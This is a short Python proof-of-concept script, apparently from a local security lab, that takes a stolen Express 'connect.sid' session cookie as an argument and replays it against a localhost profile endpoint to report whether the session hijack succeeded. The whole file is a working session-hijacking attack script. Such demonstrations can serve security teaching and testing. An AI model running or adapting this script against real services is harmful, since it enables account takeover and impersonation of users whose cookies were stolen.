import requests
import sys

if len(sys.argv) != 2:
    print(f"Usage: python {sys.argv[0]} <stolen_connect.sid>")
    sys.exit(1)

sid = sys.argv[1]

response = requests.get(
    'http://localhost:3001/api/profile',
    cookies={'connect.sid': sid}
)

if response.status_code == 200:
    print('[+] Hijack success:', response.json()['message'])
else:
    print('[-] Hijack failed:', response.text)